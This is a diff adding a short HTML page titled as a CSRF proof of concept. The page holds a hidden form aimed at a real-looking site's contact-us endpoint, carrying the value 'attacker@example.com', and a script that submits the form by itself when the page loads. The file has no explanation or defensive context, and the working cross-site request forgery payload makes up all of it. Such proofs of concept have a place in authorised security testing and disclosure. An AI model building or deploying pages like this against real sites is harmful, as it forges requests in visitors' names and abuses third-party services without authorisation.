@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CSRF Proof of Concept</title>
+</head>
+<body>
+
+<h2>CSRF Attack Demonstration</h2>
+
+<form action="https://mescas.org/contact-us/" method="POST">
+    <input type="hidden" name="email" value="attacker@example.com">
+</form>
+
+<script>
+    // Automatically submit the form
+    document.forms[0].submit();
+</script>
+
+</body>
+</html>
